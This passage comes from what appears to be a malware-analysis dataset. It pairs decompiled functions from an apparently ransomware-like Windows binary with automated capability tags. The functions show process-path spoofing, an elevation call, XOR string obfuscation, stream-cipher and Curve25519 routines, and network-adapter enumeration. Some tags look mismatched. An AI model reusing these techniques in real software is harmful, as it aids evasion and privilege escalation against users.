piVar5) = iVar1;\n        puVar8 = puVar3;\n    } while (iVar1 != 0);\n    do {\n        iVar1 = *puVar8;\n        puVar8 = puVar8 + 2;\n    } while (iVar1 != 0);\n    uVar9 = puVar8 - puVar3;\n    puVar8 = &stack0xfffffd52;\n    do {\n        piVar5 = puVar8 + 2;\n        puVar8 = puVar8 + 2;\n    } while (*piVar5 != 0);\n    for (uVar7 = uVar9 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar8 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar9 = uVar9 & 3; uVar9 != 0; uVar9 = uVar9 - 1) {\n        *puVar8 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    uVar6 = (*_sym.imp.ole32.dll_CoGetObject)(&pszName, &pBindOptions);\n    *arg_ch = ppv;\n    return uVar6;\n}\n",
        "token_count": 790
    },
    "0041a8e0": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid fcn.0041a8e0(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint uVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    uint extraout_ECX;\n    int16_t *piVar9;\n    uint *puVar10;\n    uint *puVar11;\n    int32_t in_FS_OFFSET;\n    uint lpBuffer;\n    uint var_74h;\n    uint var_3ah;\n    uint var_4h;\n    \n    iVar2 = *(*(in_FS_OFFSET + 0x18) + 0x30);\n    *0x42843c = NULL;\n    var_4h = 0x1000;\n    iVar4 = (*_sym.imp.ntdll.dll_NtAllocateVirtualMemory)(0xffffffff, 0x42843c, 0, &var_4h, 0x3000, 4);\n    if (-1 < iVar4) {\n        (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)(&lpBuffer, 0x104);\n        puVar7 = &lpBuffer;\n        piVar9 = *0x42843c;\n        do {\n            iVar1 = *puVar7;\n            puVar7 = puVar7 + 2;\n            *piVar9 = iVar1;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != 0);\n        fcn.00406e60(puVar7, var_4h);\n        puVar5 = fcn.00406c40();\n        puVar7 = puVar5;\n        do {\n            iVar1 = *puVar7;\n            puVar7 = puVar7 + 2;\n        } while (iVar1 != 0);\n        puVar11 = *0x42843c + -1;\n        do {\n            piVar9 = puVar11 + 2;\n            puVar11 = puVar11 + 2;\n        } while (*piVar9 != 0);\n        puVar10 = puVar5;\n        for (uVar8 = puVar7 - puVar5 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {\n            *puVar11 = *puVar10;\n            puVar10 = puVar10 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        for (uVar8 = puVar7 - puVar5 & 3; uVar8 != 0; uVar8 = uVar8 - 1) {\n            *puVar11 = *puVar10;\n            puVar10 = puVar10 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    }\n    (*_sym.imp.ntdll.dll_RtlAcquirePebLock)();\n    piVar9 = *0x42843c;\n    fcn.00406f50(extraout_ECX, var_4h);\n    uVar6 = fcn.00406c90();\n    pcVar3 = _sym.imp.ntdll.dll_RtlInitUnicodeString;\n    (*_sym.imp.ntdll.dll_RtlInitUnicodeString)(*(iVar2 + 0x10) + 0x38, piVar9);\n    (*pcVar3)(*(iVar2 + 0x10) + 0x40, uVar6);\n    (*_sym.imp.ntdll.dll_RtlReleasePebLock)();\n    (*_sym.imp.ntdll.dll_LdrEnumerateLoadedModules)(0, fcn.0041a6b0, 0);\n    return;\n}\n",
        "token_count": 800
    },
    "0040c420": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040c420(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00409d40(arg_8h);\n    return iVar1 + 7U >> 3;\n}\n",
        "token_count": 57
    },
    "0040cdd0": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cdd0(uint32_t arg_8h, uint32_t *arg_ch, uint32_t *arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    if (0xf < arg_8h) {\n        var_8h = arg_8h >> 4;\n        do {\n            uVar4 = *arg_ch * arg_14h;\n            uVar5 = uVar4 + var_4h;\n            uVar6 = (*arg_ch * arg_14h >> 0x20) + CARRY4(uVar4, var_4h) + CARRY4(uVar5, *arg_10h);\n            puVar1 = arg_10h + 1;\n            *arg_10h = uVar5 + *arg_10h;\n            uVar4 = arg_ch[1] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[1] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 2;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[2] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[2] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 3;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[3] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[3] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 4;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[4] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[4] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 5;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[5] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[5] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 6;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[6] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[6] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 7;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[7] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[7] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 8;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[8] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[8] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 9;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[9] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[9] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 10;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[10] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[10] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 0xb;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[0xb] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[0xb] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 0xc;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[0xc] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[0xc] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 0xd;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[0xd] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[0xd] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 0xe;\n            *puVar1 = uVar5 + *puVar1;\n            puVar1 = arg_ch + 0xf;\n            uVar4 = arg_ch[0xe] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[0xe] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar3 = arg_10h + 0xf;\n            *puVar2 = uVar5 + *puVar2;\n            arg_ch = arg_ch + 0x10;\n            uVar4 = *puVar1 * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            var_4h = (*puVar1 * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar3);\n            arg_10h = arg_10h + 0x10;\n            *puVar3 = uVar5 + *puVar3;\n            arg_8h = arg_8h - 0x10;\n            var_8h = var_8h - 1;\n        } while (var_8h != 0);\n    }\n    if (7 < arg_8h) {\n        var_8h = arg_8h >> 3;\n        do {\n            uVar4 = *arg_ch * arg_14h;\n            uVar5 = uVar4 + var_4h;\n            uVar6 = (*arg_ch * arg_14h >> 0x20) + CARRY4(uVar4, var_4h) + CARRY4(uVar5, *arg_10h);\n            puVar1 = arg_10h + 1;\n            *arg_10h = uVar5 + *arg_10h;\n            uVar4 = arg_ch[1] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[1] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 2;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[2] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[2] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 3;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[3] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[3] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 4;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[4] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[4] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 5;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[5] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[5] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 6;\n            *puVar1 = uVar5 + *puVar1;\n            puVar1 = arg_ch + 7;\n            uVar4 = arg_ch[6] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[6] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar3 = arg_10h + 7;\n            *puVar2 = uVar5 + *puVar2;\n            arg_ch = arg_ch + 8;\n            uVar4 = *puVar1 * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            var_4h = (*puVar1 * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar3);\n            arg_10h = arg_10h + 8;\n            *puVar3 = uVar5 + *puVar3;\n            arg_8h = arg_8h - 8;\n            var_8h = var_8h - 1;\n        } while (var_8h != 0);\n    }\n    for (; arg_8h != 0; arg_8h = arg_8h - 1) {\n        uVar4 = *arg_ch * arg_14h;\n        uVar5 = uVar4 + var_4h;\n        var_4h = (*arg_ch * arg_14h >> 0x20) + CARRY4(uVar4, var_4h) + CARRY4(uVar5, *arg_10h);\n        *arg_10h = uVar5 + *arg_10h;\n        arg_ch = arg_ch + 1;\n        arg_10h = arg_10h + 1;\n    }\n    do {\n        *arg_10h = *arg_10h + var_4h;\n        var_4h = *arg_10h < var_4h;\n        arg_10h = arg_10h + 1;\n    } while (var_4h != 0);\n    return;\n}\n",
        "token_count": 3032
    },
    "0040ecc0": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040ecc0(uint32_t *arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t arg_10h_00;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    if (arg_10h != 0) {\n        uVar2 = *arg_8h & 0x3f;\n        uVar1 = *arg_8h + arg_10h;\n        arg_10h_00 = 0x40 - uVar2;\n        *arg_8h = uVar1;\n        if (uVar1 < arg_10h) {\n            arg_8h[1] = arg_8h[1] + 1;\n        }\n        uVar1 = arg_10h;\n        if ((uVar2 != 0) && (arg_10h_00 <= arg_10h)) {\n            fcn.004124d0(arg_8h + uVar2 + 0x28, arg_ch, arg_10h_00);\n            uVar2 = fcn.0040e030(arg_8h, arg_8h + 10);\n            if (uVar2 != 0) {\n                return uVar2;\n            }\n            arg_ch = arg_ch + arg_10h_00;\n            uVar1 = arg_10h - arg_10h_00;\n        }\n        for (; arg_10h = uVar2,  0x3f < uVar1; uVar1 = uVar1 - 0x40) {\n            uVar2 = fcn.0040e030(arg_8h, arg_ch);\n            if (uVar2 != 0) {\n                return uVar2;\n            }\n            arg_ch = arg_ch + 0x40;\n            uVar2 = arg_10h;\n        }\n        if (uVar1 != 0) {\n            fcn.004124d0(arg_10h + 0x28 + arg_8h, arg_ch, uVar1);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 475
    },
    "0040f980": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040f980(uint32_t arg_8h)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_27h;\n    uint var_17h;\n    uint var_13h;\n    uint var_fh;\n    uchar var_bh;\n    uint var_ah;\n    uchar var_6h;\n    uint var_5h;\n    \n    var_ah._0_1_ = 0x73;\n    var_6h = 0x32;\n    var_5h._0_1_ = 0;\n    var_bh = 0x75;\n    var_ah._1_1_ = 0x65;\n    var_ah._2_1_ = 0x72;\n    var_ah._3_1_ = 0x33;\n    uVar1 = fcn.00401000();\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&var_bh, uVar1);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (arg_8h < 7) {\n    // switch table (7 cases) at 0x40fa54\n        switch(*(*(arg_8h + 0x40fa60) * 4 + 0x40fa54)) {\n        case 0x40fa14:\n            return 1;\n        default:\n            if (pcVar2 != NULL) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetConsoleWindow)(0);\n                (*pcVar2)(uVar1);\n            }\n            (*_sym.imp.KERNEL32.dll_Sleep)(99999);\n            return 1;\n        case 0x40fa48:\n            break;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 403
    },
    "0041a130": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041a130(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint arg_8h;\n    int32_t iVar6;\n    uint *puVar7;\n    int32_t *piVar8;\n    int32_t pszPath;\n    int32_t iStack80;\n    int32_t iStack76;\n    int32_t iStack72;\n    uint ARG_0;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar var_1ch;\n    uchar var_1bh;\n    uchar var_1ah;\n    uchar var_19h;\n    uint var_18h;\n    uchar var_14h;\n    uchar var_13h;\n    uchar var_12h;\n    uchar var_11h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    pcVar3 = _sym.imp.msvcrt.dll_malloc;\n    var_8h = 0x288;\n    piVar4 = (*_sym.imp.msvcrt.dll_malloc)(0x288);\n    pcVar2 = _sym.imp.IPHLPAPI.DLL_GetAdaptersInfo;\n    if (piVar4 != NULL) {\n        var_10h = piVar4;\n        iVar5 = (*_sym.imp.IPHLPAPI.DLL_GetAdaptersInfo)(piVar4, &var_8h);\n        if (iVar5 == 0x6f) {\n            (*_sym.imp.msvcrt.dll_free)(piVar4);\n            piVar4 = (*pcVar3)(var_8h);\n            var_10h = piVar4;\n            if (piVar4 == NULL) {\n                return;\n            }\n        }\n        iVar5 = (*pcVar2)(piVar4, &var_8h);\n        piVar8 = piVar4;\n        if (iVar5 == 0) {\n            if (piVar4 == NULL) {\n                return;\n            }\n            do {\n                if (piVar4[0x68] != 0x18) {\n                    var_20h._0_1_ = 0x69;\n                    var_18h._0_1_ = 0;\n                    var_20h._2_1_ = 0x2e;\n                    var_1ah = 0x2e;\n                    var_20h._1_1_ = 0x30;\n                    var_1bh = 0x30;\n                    var_ch = piVar4 + 0x6c;\n                    var_20h._3_1_ = 0x30;\n                    var_19h = 0x30;\n                    var_1ch = 0x2e;\n                    var_4h = piVar4;\n                    iVar5 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(var_ch, &var_20h + 1);\n                    piVar8 = var_ch;\n                    if (iVar5 != 0) {\n                        pszPath = *var_ch;\n                        iStack80 = var_ch[1];\n                        iStack76 = var_ch[2];\n                        iStack72 = var_ch[3];\n                        (*_sym.imp.SHLWAPI.dll_PathRemoveExtensionA)(&pszPath);\n                        puVar7 = &pszPath;\n                        var_28h = 0x4e534c52;\n                        ARG_0 = *0x423b90;\n                        uStack56 = *0x423b94;\n                        uStack52 = *0x423b98;\n                        uStack48 = *0x423b9c;\n                        var_24h._0_2_ = 0x48;\n                        arg_8h = fcn.00401e40();\n                        fcn.0040f630(arg_8h, puVar7);\n                        iVar5 = 0;\n                        do {\n                            var_18h._1_1_ = 7;\n                            var_11h = 0;\n                            var_18h._2_1_ = 0x25;\n                            var_12h = 100;\n                            var_18h._3_1_ = 0x73;\n                            var_14h = 0x2e;\n                            var_13h = 0x25;\n                            (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, &var_18h + 2, &pszPath, iVar5);\n                            iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(piVar8, &ARG_0);\n                            if (iVar6 != 0) {\n                                iVar6 = (*_sym.imp.msvcrt.dll_malloc)(0x1c);\n                                puVar7 = &ARG_0;\n                                do {\n                                    cVar1 = *puVar7;\n                                    *(puVar7 + (iVar6 - &ARG_0) + 4) = cVar1;\n                                    puVar7 = puVar7 + 1;\n                                } while (cVar1 != '\\0');\n                                (*_sym.imp.ntdll.dll_RtlInterlockedPushEntrySList)(*0x42822c, iVar6);\n                                *0x428438 = *0x428438 + 1;\n                                piVar8 = var_ch;\n                            }\n                            iVar5 = iVar5 + 1;\n                            piVar4 = var_4h;\n                        } while (iVar5 < 0xff);\n                    }\n                }\n                piVar4 = *piVar4;\n                piVar8 = var_10h;\n                var_4h = piVar4;\n            } while (piVar4 != NULL);\n        }\n        if (piVar8 != NULL) {\n            (*_sym.imp.msvcrt.dll_free)(piVar8);\n        }\n    }\n    return;\n}\n",
        "token_count": 1309
    },
    "00401000": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00401000(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    // [00] -r-x section size 106496 named .text\n    iVar2 = 5;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        puVar1[2] = puVar1[2] ^ *param_1;\n        puVar1[3] = puVar1[3] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 5;\n    } while (iVar2 != 0);\n    param_1[0x1a] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 230
    },
    "00401040": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00401040(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 7;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 3;\n    } while (iVar2 != 0);\n    param_1[0x16] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 172
    },
    "00401370": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00401370(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 9;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        puVar1[2] = puVar1[2] ^ *param_1;\n        puVar1[3] = puVar1[3] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 5;\n    } while (iVar2 != 0);\n    param_1[0x2e] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 213
    },
    "004013b0": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.004013b0(uint8_t *param_1)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0xd;\n    piVar1 = param_1 + 4;\n    do {\n        piVar1[-1] = *(piVar1 + -1) ^ *param_1;\n        *piVar1 = *param_1 ^ *piVar1;\n        piVar1[1] = *(piVar1 + 1) ^ *param_1;\n        iVar2 = iVar2 + -1;\n        piVar1 = piVar1 + 3;\n    } while (iVar2 != 0);\n    *(param_1 + 0x50) = 0;\n    return param_1 + 2;\n}\n",
        "token_count": 180
    },
    "00401480": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00401480(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0x20;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        puVar1[2] = puVar1[2] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 4;\n    } while (iVar2 != 0);\n    param_1[0x81] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 194
    },
    "00401c50": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00401c50(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 4;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        puVar1[2] = puVar1[2] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 4;\n    } while (iVar2 != 0);\n    param_1[0x11] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 193
    },
    "00401c90": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00401c90(uint8_t *param_1)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0x43;\n    piVar1 = param_1 + 4;\n    do {\n        piVar1[-1] = *(piVar1 + -1) ^ *param_1;\n        *piVar1 = *param_1 ^ *piVar1;\n        piVar1[1] = *(piVar1 + 1) ^ *param_1;\n        iVar2 = iVar2 + -1;\n        piVar1 = piVar1 + 3;\n    } while (iVar2 != 0);\n    *(param_1 + 0x194) = 0;\n    return param_1 + 2;\n}\n",
        "token_count": 181
    },
    "00401ce0": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00401ce0(uint8_t *param_1)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = 3;\n    piVar1 = param_1 + 4;\n    do {\n        piVar1[-1] = *(piVar1 + -1) ^ *param_1;\n        *piVar1 = *param_1 ^ *piVar1;\n        piVar1[1] = *(piVar1 + 1) ^ *param_1;\n        piVar1[2] = *(piVar1 + 2) ^ *param_1;\n        piVar1[3] = *(piVar1 + 3) ^ *param_1;\n        iVar2 = iVar2 + -1;\n        piVar1 = piVar1 + 5;\n    } while (iVar2 != 0);\n    *(param_1 + 0x20) = 0;\n    return param_1 + 2;\n}\n",
        "token_count": 223
    },
    "00401d50": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00401d50(uint8_t *param_1)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = 7;\n    piVar1 = param_1 + 4;\n    do {\n        piVar1[-1] = *(piVar1 + -1) ^ *param_1;\n        *piVar1 = *param_1 ^ *piVar1;\n        piVar1[1] = *(piVar1 + 1) ^ *param_1;\n        iVar2 = iVar2 + -1;\n        piVar1 = piVar1 + 3;\n    } while (iVar2 != 0);\n    *(param_1 + 0x2c) = 0;\n    return param_1 + 2;\n}\n",
        "token_count": 180
    },
    "00401da0": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00401da0(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 3;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        puVar1[2] = puVar1[2] ^ *param_1;\n        puVar1[3] = puVar1[3] ^ *param_1;\n        puVar1[4] = puVar1[4] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 6;\n    } while (iVar2 != 0);\n    param_1[0x13] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 233
    },
    "00401df0": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00401df0(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 2;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        puVar1[2] = puVar1[2] ^ *param_1;\n        puVar1[3] = puVar1[3] ^ *param_1;\n        puVar1[4] = puVar1[4] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 6;\n    } while (iVar2 != 0);\n    param_1[0xd] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 232
    },
    "00401e40": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00401e40(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 4;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        puVar1[1] = puVar1[1] ^ *param_1;\n        puVar1[2] = puVar1[2] ^ *param_1;\n        puVar1[3] = puVar1[3] ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 5;\n    } while (iVar2 != 0);\n    param_1[0x15] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 213
    },
    "00401ed0": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00401ed0(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0xd;\n    puVar1 = param_1 + 2;\n    do {\n        puVar1[-1] = puVar1[-1] ^ *param_1;\n        *puVar1 = *puVar1 ^ *param_1;\n        iVar2 = iVar2 + -1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 != 0);\n    param_1[0x1b] = 0;\n    return param_1 + 1;\n}\n",
        "token_count": 155
    },
    "00401f00": {
        "rules": [
            "encode data using XOR"
        ],
